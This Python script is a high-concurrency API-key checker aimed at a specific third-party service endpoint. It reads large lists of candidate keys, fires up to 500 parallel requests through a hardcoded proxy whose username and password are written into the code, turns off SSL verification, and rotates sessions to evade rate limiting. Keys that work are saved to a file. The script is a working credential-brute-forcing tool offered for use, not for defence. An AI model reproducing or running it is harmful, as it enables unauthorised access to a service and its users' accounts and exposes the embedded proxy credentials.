import json
import sys
import argparse
import os
import asyncio
import aiohttp
import random
import time
from typing import Tuple, List, Dict, Any

# Configuration
ENDPOINT = "https://hwclutch.com/incap"
USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
DEFAULT_PROXY = "http://lho7SIZFaRh9:1inYc0RRMvYs@144.229.117.13:1337"
DEFAULT_CONCURRENT_REQUESTS = 500  # Significantly increased from 100
DEFAULT_VALID_KEYS_FILE = "valid_hwclutch_keys.txt"
MAX_RETRIES = 3  # Retry failed requests
TIMEOUT = 10  # Reduced timeout for faster processing

# Create a lock for file writing to prevent race conditions
file_lock = asyncio.Lock()

async def validate_api_key(session: aiohttp.ClientSession, api_key: str, semaphore: asyncio.Semaphore, 
                          retry_count: int = 0) -> Tuple[str, bool]:
    """Validate a single API key asynchronously with semaphore control and retry logic"""
    # Data to send
    data = {
        'api-key': api_key,
        'useragent': USER_AGENT
    }

    async with semaphore:  # Limit concurrent requests
        try:
            # Make request
            async with session.post(ENDPOINT, json=data, timeout=TIMEOUT) as response:
                if response.status == 200:
                    try:
                        response_json = await response.json()
                        success = response_json.get('success', False)
                        return api_key, success
                    except:
                        # JSON parsing error, retry if possible
                        if retry_count < MAX_RETRIES:
                            return await validate_api_key(session, api_key, semaphore, retry_count + 1)
                        return api_key, False
                else:
                    # Non-200 response, retry if possible
                    if retry_count < MAX_RETRIES and response.status != 403:  # Don't retry if forbidden
                        return await validate_api_key(session, api_key, semaphore, retry_count + 1)
                    return api_key, False
                    
        except asyncio.TimeoutError:
            # Timeout, retry if possible
            if retry_count < MAX_RETRIES:
                return await validate_api_key(session, api_key, semaphore, retry_count + 1)
            return api_key, False
        except Exception:
            # Other errors, retry if possible
            if retry_count < MAX_RETRIES:
                return await validate_api_key(session, api_key, semaphore, retry_count + 1)
            return api_key, False

async def save_valid_key(key: str, output_file: str):
    """Save a valid key to file with lock to prevent race conditions"""
    async with file_lock:
        with open(output_file, 'a') as f:
            f.write(f"{key}\n")

async def process_batch(session: aiohttp.ClientSession, batch: List[str], semaphore: asyncio.Semaphore, 
                       output_file: str) -> List[str]:
    """Process a batch of API keys with optimized task handling"""
    tasks = [validate_api_key(session, key, semaphore) for key in batch]
    results = await asyncio.gather(*tasks)
    
    # Get valid keys
    valid_keys = [key for key, success in results if success]
    
    # Save valid keys to file as they're found
    for key in valid_keys:
        print(f"Valid Key Found: {key}")
        await save_valid_key(key, output_file)
        
    return valid_keys

async def create_optimized_session(proxy=DEFAULT_PROXY, max_concurrent=DEFAULT_CONCURRENT_REQUESTS):
    """Create an optimized session with connection pooling"""
    # Use a connector with connection pooling
    connector = aiohttp.TCPConnector(
        ssl=False,
        limit=max_concurrent,  # Increase connection pool size
        ttl_dns_cache=300,  # Cache DNS lookups
        use_dns_cache=True,
        force_close=False  # Keep connections alive
    )
    
    # Create session with optimized settings
    return aiohttp.ClientSession(
        connector=connector,
        headers={
            'User-Agent': USER_AGENT,
            'Connection': 'keep-alive',  # Keep connections alive
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br'
        },
        timeout=aiohttp.ClientTimeout(total=TIMEOUT),
        raise_for_status=False
    )

async def test_keys_from_file_async(filename: str, output_file: str, batch_size: int = 5000, 
                                   max_concurrent: int = DEFAULT_CONCURRENT_REQUESTS) -> None:
    """Test API keys from file in batches with optimized performance"""
    if not os.path.isfile(filename):
        print(f"Error: File '{filename}' not found")
        return

    # Create a semaphore to limit concurrent requests
    semaphore = asyncio.Semaphore(max_concurrent)
    
    # Initialize or clear the valid keys file
    with open(output_file, 'w') as f:
        f.write(f"# Valid HWClutch API Keys - Started {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    # Create an optimized session
    session = await create_optimized_session(max_concurrent=max_concurrent)
    
    try:
        valid_keys_count = 0
        batch = []
        batch_count = 0
        total_processed = 0
        start_time = time.time()
        
        # Process file line by line to avoid loading everything into memory
        with open(filename, 'r') as file:
            for line in file:
                api_key = line.strip()
                if not api_key:
                    continue
                    
                batch.append(api_key)
                
                # When batch is full, process it
                if len(batch) >= batch_size:
                    batch_count += 1
                    total_processed += len(batch)
                    
                    # Calculate and display progress
                    elapsed_time = time.time() - start_time
                    keys_per_second = total_processed / elapsed_time if elapsed_time > 0 else 0
                    
                    print(f"Processing batch {batch_count} ({total_processed:,} keys processed, "
                          f"{keys_per_second:.2f} keys/sec, {valid_keys_count} valid keys found)")
                    
                    valid_keys = await process_batch(session, batch, semaphore, output_file)
                    valid_keys_count += len(valid_keys)
                    
                    # Clear batch for next round
                    batch = []
                    
                    # Rotate session every few batches to avoid rate limiting
                    if batch_count % 10 == 0:
                        await session.close()
                        session = await create_optimized_session(max_concurrent=max_concurrent)
        
        # Process any remaining keys in the last batch
        if batch:
            batch_count += 1
            total_processed += len(batch)
            print(f"Processing final batch {batch_count} ({total_processed:,} keys processed)")
            valid_keys = await process_batch(session, batch, semaphore, output_file)
            valid_keys_count += len(valid_keys)
        
        # Calculate total time
        total_time = time.time() - start_time
        hours, remainder = divmod(total_time, 3600)
        minutes, seconds = divmod(remainder, 60)
        
        print(f"\nProcessing complete!")
        print(f"Total time: {int(hours)}h {int(minutes)}m {int(seconds)}s")
        print(f"Total keys processed: {total_processed:,}")
        print(f"Processing speed: {total_processed / total_time:.2f} keys/second")
        print(f"Valid keys found: {valid_keys_count}")
        print(f"All valid keys saved to: {output_file}")
    
    finally:
        # Ensure session is closed
        await session.close()

async def test_single_key_async(api_key: str, output_file: str, 
                               max_concurrent: int = DEFAULT_CONCURRENT_REQUESTS) -> None:
    """Test a single API key asynchronously"""
    semaphore = asyncio.Semaphore(1)
    session = await create_optimized_session(max_concurrent=max_concurrent)
    
    try:
        key, success = await validate_api_key(session, api_key, semaphore)
        if success:
            print(f"Valid Key: {key}")
            # Also save to file
            await save_valid_key(key, output_file)
            print(f"Key saved to {output_file}")
        else:
            print(f"Invalid Key: {key}")
    finally:
        await session.close()

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Validate HWClutch API keys')
    parser.add_argument('--file', default="hwclutch_api_keys.txt", help='File containing API keys')
    parser.add_argument('--batch-size', type=int, default=5000, help='Number of keys to process in each batch')
    parser.add_argument('--api-key', help='Single API key to validate')
    parser.add_argument('--output', default=DEFAULT_VALID_KEYS_FILE, help='File to save valid keys')
    parser.add_argument('--concurrency', type=int, default=DEFAULT_CONCURRENT_REQUESTS, 
                        help='Maximum number of concurrent requests')
    
    args = parser.parse_args()
    output_file = args.output
    max_concurrent = args.concurrency
    
    if args.api_key:
        # Test a single key
        asyncio.run(test_single_key_async(args.api_key, output_file, max_concurrent))
    else:
        # Test keys from file in batches
        asyncio.run(test_keys_from_file_async(args.file, output_file, args.batch_size, max_concurrent))

if __name__ == "__main__":
    main()